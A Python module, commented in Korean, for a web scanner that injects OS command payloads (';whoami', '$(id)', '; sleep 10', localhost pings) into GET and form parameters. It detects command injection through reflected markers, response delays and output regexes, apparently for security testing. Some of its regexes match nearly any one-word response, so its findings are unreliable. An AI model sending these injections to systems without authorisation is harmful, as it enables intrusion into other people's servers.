"""
이 모듈은 BaseScanner를 상속받아 새로운 취약점 스캐너를 구현할 때 참고할 수 있는 예시입니다.

- 반드시 오버라이드해야 하는 메타데이터(vulnerability_name, description, risk_level)와 필수 메서드 구현 예시 포함
- 각 메서드의 역할과 반환값 예시를 한글 주석으로 설명
- celery_app import 및 task 데코레이터 사용 예시 포함

새로운 취약점 스캐너를 만들 때, 이 구조를 참고하여 구현하세요.
"""
import urllib.parse
import random
import string
import time
import re
from datetime import datetime
from typing import Any, Dict, Iterable, List, cast
from celery.result import AsyncResult
from celery import chain
from db_writer import (
    insert_fuzzed_request,
    insert_fuzzed_response,
    insert_vulnerability_scan_result,
)
from scanners.base import BaseScanner
from fuzzing_scheduler.fuzzing_scheduler import celery_app
from fuzzing_scheduler.fuzzing_scheduler import send_fuzz_request
from typedefs import RequestData, Body


class CommandiScanner(BaseScanner):
    """
    BaseScanner를 상속받는 예시 취약점 스캐너
    """

    # --- 반드시 오버라이드해야 하는 메타데이터 ---
    # 취약점 이름 (예: "XSS", "SQLi" 등)
    @property
    def vulnerability_name(self) -> str:
        return "CMD_injection"

    def is_target(self, request_id: int, request: RequestData) -> bool:
        """
        이 스캐너가 해당 요청을 퍼징할 가치가 있는지 판단
        예시: GET 요청 또는 application/x-www-form-urlencoded POST만 대상으로 함
        """
        method = request["meta"]["method"]
        headers = request["headers"]
        content_type = ""
        if headers is not None:
            for header in headers:
                if header.get("key", "").lower() == "Content-Type".lower():
                    content_type = header.get("value", "")

        if method == "GET":
            return True
        if method == "POST" and "application/x-www-form-urlencoded" in content_type:
            return True
        return False

    def generate_fuzzing_requests(self, request: RequestData) -> Iterable[RequestData]:
        # 고유 마커 생성
        unique_marker = "".join(
            random.choices(string.ascii_letters + string.digits, k=8)
        )

        # --- 리플렉티드 페이로드 (응답에 결과가 반영되는 경우) ---
        reflected_payloads = [
            # echo/printf 마커 (기존)
            f";CMDTEST{unique_marker}",
            f"; echo CMDTEST{unique_marker}",
            f"&& echo CMDTEST{unique_marker}",
            f"| echo CMDTEST{unique_marker}",
            f"|| echo CMDTEST{unique_marker}",
            f"; printf 'CMDTEST{unique_marker}'",
            f"&& printf 'CMDTEST{unique_marker}'",
            f"`echo CMDTEST{unique_marker}`",
            f"$(echo CMDTEST{unique_marker})",
            # --- 실제 명령어 ---
            # whoami
            f"; whoami",
            f"&& whoami",
            f"| whoami",
            f"|| whoami",
            f"`whoami`",
            f"$(whoami)",
            # id
            f"; id",
            f"&& id",
            f"| id",
            f"|| id",
            f"`id`",
            f"$(id)",
            # ls
            f"; ls",
            f"&& ls",
            f"| ls",
            f"|| ls",
            f"`ls`",
            f"$(ls)",
            # pwd
            f"; pwd",
            f"&& pwd",
            f"| pwd",
            f"|| pwd",
            f"`pwd`",
            f"$(pwd)",
            # uname -a
            f"; uname -a",
            f"&& uname -a",
            f"| uname -a",
            f"|| uname -a",
            f"`uname -a`",
            f"$(uname -a)",
            # hostname
            f"; hostname",
            f"&& hostname",
            f"| hostname",
            f"|| hostname",
            f"`hostname`",
            f"$(hostname)",
            # --- Windows 명령 ---
            # dir
            f"; dir",
            f"&& dir",
            f"| dir",
            f"|| dir",
            f"`dir`",
            f"$(dir)",
            # ver
            f"; ver",
            f"&& ver",
            f"| ver",
            f"|| ver",
            f"`ver`",
            f"$(ver)",
        ]

        # --- 타임 기반 페이로드 (블라인드 인젝션용) ---
        delay_time = 10
        time_based_payloads = [
            f"; sleep {delay_time}",
            f"&& sleep {delay_time}",
            f"| sleep {delay_time}",
            f"|| sleep {delay_time}",
            f"`sleep {delay_time}`",
            f"$(sleep {delay_time})",
            f"; ping -c {delay_time} 127.0.0.1",
            f"&& ping -c {delay_time} 127.0.0.1",
            # Windows 지원
            f"; timeout {delay_time}",
            f"&& timeout {delay_time}",
            f"; ping -n {delay_time} 127.0.0.1",
            f"&& ping -n {delay_time} 127.0.0.1",
        ]

        all_payloads = reflected_payloads + time_based_payloads

        # --- GET 파라미터 테스트 ---
        query_params = request.get("query_params") or []
        for payload in all_payloads:
            for i, param in enumerate(query_params):
                new_query_params = [p.copy() for p in query_params]
                new_query_params[i]["value"] = payload

                fuzzing_request = request.copy()
                fuzzing_request["query_params"] = new_query_params
                fuzzing_request["extra"] = {
                    "fuzzed_param": param["key"],
                    "payload": payload,
                    "unique_marker": unique_marker if "CMDTEST" in payload else None,
                    "expected_delay": (
                        delay_time
                        if "sleep" in payload
                        or "ping" in payload
                        or "timeout" in payload
                        else None
                    ),
                }

                yield fuzzing_request

        # --- POST 파라미터 테스트 ---
        method = request["meta"].get("method", "")
        headers = request.get("headers") or []
        content_type = ""

        if headers:
            for header in headers:
                if header.get("key", "").lower() == "content-type":
                    content_type = header.get("value", "")

        if (
            method == "POST"
            and "application/x-www-form-urlencoded" in content_type.lower()
            and request.get("body") is not None
        ):
            form_body = request["body"]

            if (
                form_body is not None
                and hasattr(form_body, "get")
                and callable(form_body.get)
            ):
                raw_body = form_body.get("body")
                if not isinstance(raw_body, str):
                    return

                parsed_form = dict(urllib.parse.parse_qsl(raw_body))

                for payload in all_payloads:
                    for key in parsed_form.keys():
                        new_form = parsed_form.copy()
                        new_form[key] = payload
                        encoded_body = urllib.parse.urlencode(new_form)

                        if hasattr(form_body, "copy") and callable(form_body.copy):
                            new_body_obj = form_body.copy()
                            new_body_obj["body"] = encoded_body
                        else:
                            new_body_obj = {"body": encoded_body}

                        fuzzing_request = request.copy()
                        fuzzing_request["body"] = cast(Body, new_body_obj)
                        fuzzing_request["extra"] = {
                            "fuzzed_param": key,
                            "payload": payload,
                            "unique_marker": (
                                unique_marker if "CMDTEST" in payload else None
                            ),
                            "expected_delay": (
                                delay_time
                                if "sleep" in payload
                                or "ping" in payload
                                or "timeout" in payload
                                else None
                            ),
                        }

                        yield fuzzing_request

    def run(
        self,
        request_id: int,
        request: RequestData,
    ) -> List[Dict[str, Any]]:
        if not self.is_target(request_id, request):
            return []

        async_results: List[AsyncResult] = []

        # 퍼징 요청 생성 및 비동기 전송
        for fuzzing_request in self.generate_fuzzing_requests(request):
            async_result = chain(
                send_fuzz_request.s(request_data=fuzzing_request)
                | analyze_response_commandi.s()
            ).apply_async()
            if async_result is not None:
                async_results.append(async_result)

        # 비동기 작업 결과 수집
        pending = list(async_results)
        while pending:
            for res in pending[:]:
                if res.ready():
                    result = res.get()
                    if result and res.parent is not None:
                        fuzzed_request: RequestData = res.parent.get().get(
                            "request_data"
                        )
                        fuzzed_request_dict = to_fuzzed_request_dict(
                            fuzzed_request,
                            original_request_id=request_id,
                            scanner=self.vulnerability_name,
                            payload=fuzzed_request.get("extra", {}).get("payload", ""),
                        )

                        fuzzed_response = res.parent.get()
                        fuzzed_response = to_fuzzed_response_dict(fuzzed_response)

                        # DB에 저장
                        try:
                            fuzzed_request_id = insert_fuzzed_request(
                                fuzzed_request_dict
                            )
                        except Exception as e:
                            continue

                        try:
                            insert_fuzzed_response(fuzzed_response, fuzzed_request_id)
                        except Exception as e:
                            pass

                        # 취약점 발견 시 결과 저장
                        if result and result != {}:
                            print(f"[취약점 발견] {result.get('evidence', '')}")
                            scan_result = {
                                "vulnerability_name": self.vulnerability_name,
                                "original_request_id": request_id,
                                "fuzzed_request_id": fuzzed_request_id,
                                "domain": fuzzed_request.get("meta", {}).get(
                                    "domain", ""
                                ),
                                "endpoint": fuzzed_request.get("meta", {}).get(
                                    "path", ""
                                ),
                                "method": fuzzed_request.get("meta", {}).get(
                                    "method", ""
                                ),
                                "payload": fuzzed_request.get("extra", {}).get(
                                    "payload", ""
                                ),
                                "parameter": fuzzed_request.get("extra", {}).get(
                                    "fuzzed_param", ""
                                ),
                                "extra": {
                                    "confidence": 0.9,
                                    "details": result.get("evidence", "취약점 발견"),
                                    "timestamp": datetime.now().isoformat(),
                                },
                            }
                            try:
                                result_id = insert_vulnerability_scan_result(
                                    scan_result
                                )
                            except Exception as e:
                                pass

                    pending.remove(res)
            time.sleep(0.5)
        return []


@celery_app.task(name="tasks.analyze_response_commandi", queue="analyze_response")
def analyze_response_commandi(response: Dict[str, Any]) -> Dict[str, Any]:
    """
    개선된 커맨드 인젝션 탐지: 리플렉티드 + 타임 기반 + 명령어 결과 패턴 기반
    """
    request_data = response.get("request_data", {})
    extra_info = request_data.get("extra", {})
    payload = extra_info.get("payload", "")
    unique_marker = extra_info.get("unique_marker")
    expected_delay = extra_info.get("expected_delay")
    response_text = response.get("text", "")
    response_time = response.get("response_time", 0)  # 밀리초 단위

    # 1. 리플렉티드 탐지 (고유 마커 기반)
    if unique_marker and f"CMDTEST{unique_marker}" in response_text:
        return {
            "payload": payload,
            "evidence": f"고유 마커 'CMDTEST{unique_marker}'가 응답에 정확히 반영됨",
            "detection_type": "reflected",
            "confidence": 0.95,
        }

    # 2. 타임 기반 탐지 (응답 시간 기반)
    if expected_delay and response_time > 0:
        response_time_sec = response_time / 1000.0
        if (expected_delay - 1.0) <= response_time_sec <= (expected_delay + 1.0):
            return {
                "payload": payload,
                "evidence": f"응답 시간 지연 탐지: {response_time_sec:.2f}초 (예상: {expected_delay}초)",
                "detection_type": "time_based",
                "confidence": 0.85,
            }

    # 3. 명령어 실행 결과 패턴 기반 탐지
    # 명령어별 결과 패턴 정규식 (Unix/Windows 모두 포함)
    specific_patterns = [
        # echo/printf 마커
        r"CMDTEST[A-Za-z0-9]{8}",
        # id
        r"^uid=\d+\(.*\) gid=\d+\(.*\) groups=",
        # whoami
        r"^[a-zA-Z0-9_-]+$",
        # pwd (Unix)
        r"^/[A-Za-z0-9_/.-]*$",
        # pwd (Windows)
        r"^[A-Z]:\\\\[A-Za-z0-9_\\\\.-]*$",
        # uname -a
        r"Linux.*\d+\.\d+\.\d+",
        r"Darwin.*\d+\.\d+\.\d+",
        # hostname
        r"^[a-zA-Z0-9.-]+$",
        # ver (Windows)
        r"Microsoft Windows.*Version \d+\.\d+",
        # dir (Windows)
        r"^\s*Directory of [A-Z]:\\\\",
        # ls -l 첫줄 (Unix)
        r"^total \d+$",
    ]

    for pattern in specific_patterns:
        if re.search(pattern, response_text, re.MULTILINE):
            return {
                "payload": payload,
                "evidence": f"명령어 실행 결과 패턴 매칭: {pattern}",
                "detection_type": "pattern_based",
                "confidence": 0.75,
            }

    return {}


def to_fuzzed_request_dict(
    fuzzing_request: RequestData,
    original_request_id: int,
    scanner: str,
    payload: str,
) -> dict:
    """traffic_filter.py의 flow_to_request_dict 구조에 맞게 변환"""
    meta = fuzzing_request["meta"]
    headers = fuzzing_request.get("headers")

    headers_dict = {}
    if headers:
        for h in headers:
            headers_dict[h["key"]] = h["value"]

    return {
        "original_request_id": original_request_id,
        "scanner": scanner,
        "payload": payload,
        "is_http": meta.get("is_http"),
        "http_version": meta.get("http_version"),
        "domain": meta.get("domain"),
        "path": meta.get("path"),
        "method": meta.get("method"),
        "timestamp": meta.get("timestamp"),
        "headers": headers_dict,
        "query": fuzzing_request.get("query_params", []),
        "body": fuzzing_request.get("body"),
    }


def to_fuzzed_response_dict(fuzzed_response: dict) -> dict:
    """traffic_filter.py의 flow_to_response_dict 구조에 맞게 변환"""
    headers = fuzzed_response.get("headers", {})
    content_type = headers.get("Content-Type", "")

    charset = None
    if "charset=" in content_type.lower():
        charset = content_type.split("charset=")[-1].strip()

    body_dict = {
        "content_type": content_type,
        "charset": charset,
        "content_length": headers.get("Content-Length"),
        "content_encoding": headers.get("Content-Encoding"),
        "body": fuzzed_response.get("body"),
    }
    return {
        "http_version": fuzzed_response.get("http_version"),
        "status_code": fuzzed_response.get("status_code"),
        "timestamp": fuzzed_response.get("timestamp"),
        "headers": headers,
        "body": body_dict,
    }
